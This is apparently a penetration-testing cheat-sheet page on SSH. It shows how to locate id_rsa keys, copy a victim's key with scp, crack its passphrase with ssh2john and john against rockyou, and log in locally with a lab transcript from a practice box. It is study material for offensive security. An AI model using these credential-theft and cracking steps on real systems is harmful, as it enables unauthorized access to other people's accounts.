# (22) SSH

<details>

<summary>Finding SSH Private Keys</summary>

```bash
/home/user/.ssh/id_rsa
```

```
find /home/ -name "id_rsa"
```

</details>

<details>

<summary>SSH with Private Key</summary>

```
ssh -i svuser.key svuser@controller
```

</details>

<details>

<summary>How to tell if a key is encrypted with passphrase?</summary>

![](<../.gitbook/assets/image (300).png>)

</details>

<details>

<summary>Cracking passphrase of SSH key</summary>

<pre><code><strong>#Copy file over to Kali
</strong><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
</code></pre>

</details>

<details>

<summary>SSH from localhost to localhost</summary>

* Useful if SSH port is not opened to external IP

```bash
www-data@nineveh:/dev/shm$ chmod 600 nineveh.priv 
www-data@nineveh:/dev/shm$ ssh -i nineveh.priv amrois@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Wed May 10 08:01:22 2023 from 10.10.14.2
amrois@nineveh:~$ whoami
amrois
```

</details>

<pre><code><strong>scp root@linuxvictim:/home/linuxvictim/svuser.key .
</strong>/usr/share/john/ssh2john.py svuser.key > svuser.hash
john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
</code></pre>



